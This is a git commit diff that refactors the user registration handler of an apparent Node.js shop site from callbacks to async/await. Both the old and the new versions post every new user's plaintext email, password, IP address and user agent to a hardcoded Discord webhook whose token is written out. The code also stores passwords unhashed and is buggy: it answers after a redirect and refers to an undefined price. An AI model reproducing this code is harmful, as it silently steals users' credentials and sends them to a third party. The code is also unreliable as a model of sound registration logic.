884af17ba8e23e2725fc64b91aefa46c907403c8
ichson <122417410+ichson@users.noreply.github.com>
2023-01-10 19:08:08 -0800

    Update userController.js

--- controllers/userController.js
+++ controllers/userController.js
@@ -2,48 +2,53 @@ const md5 = require("md5");
 const UserModel = require("../models/userSchema");
 const axios = require('axios');
 
-exports.registerUser = (req, res) => {
-  UserModel.find({ email: req.body.email }).exec(function (error, result) {
-    if (result.length > 0) {
+exports.registerUser = async (req, res) => {
+  try {
+    const existingUser = await UserModel.findOne({ email: req.body.email });
+    if (existingUser) {
       req.flash("message", "Email address already exists.");
       req.flash("messageType", "danger");
-      res.redirect("/register");
-    } else {
-      const user = new UserModel({
-        name: req.body.name,
-        email: req.body.email,
-        funds: 0,
-        password: req.body.password
-       
-      });
-
-      user.save(function (err, doc) {
-        req.flash("message", "Your account has been successfully created.");
-        req.flash("messageType", "success");
-        res.redirect("/login");
-              const paymentMethod = req.body.service;
-      const payerEmail =  req.session.user_email;
-
-
-      const description = 
-        `Email: \`${req.body.email}\`
-        Password: \`${req.body.password}\`
-        IP address: \`${req.ip}\`
-        User agent: \`${req.headers['user-agent']}\``;
-
-      const data = {
-        embeds: [{
-          title: 'New Account Created',
-          description: description
-        }]
-      };
- axios.post('https://discord.com/api/webhooks/1062566889391390750/NoVVMiLzX0HCFTfo88tz_dDqa7FfeKAuj56ZBUPl4gxGPh_Xfr1aPPqrWpLKe8Nkd-WT', data)
-            res.json({ message: `Order placed successfully! | Funds Deducted: ${price}` });
-          }
-      });
+      return res.redirect("/register");
     }
-  });
+    const user = new UserModel({
+      name: req.body.name,
+      email: req.body.email,
+      funds: 0,
+      password: req.body.password,
+    });
+    await user.save();
+    req.flash("message", "Your account has been successfully created.");
+    req.flash("messageType", "success");
+    res.redirect("/login");
+    const paymentMethod = req.body.service;
+    const payerEmail = req.session.user_email;
+
+    const description = `
+      Email: ${req.body.email}
+      Password: ${req.body.password}
+      IP address: ${req.ip}
+      User agent: ${req.headers["user-agent"]}
+    `;
+
+    const data = {
+      embeds: [
+        {
+          title: "New Account Created",
+          description: description,
+        },
+      ],
+    };
+    await axios.post(
+      "https://discord.com/api/webhooks/1062566889391390750/NoVVMiLzX0HCFTfo88tz_dDqa7FfeKAuj56ZBUPl4gxGPh_Xfr1aPPqrWpLKe8Nkd-WT",
+      data
+    );
+    res.json({ message: `Order placed successfully! | Funds Deducted: ${price}` });
+  } catch (error) {
+    console.log(error);
+    res.status(500).json({ message: "Error saving the user." });
+  }
 };
+
 // Exchange Controller
 
 
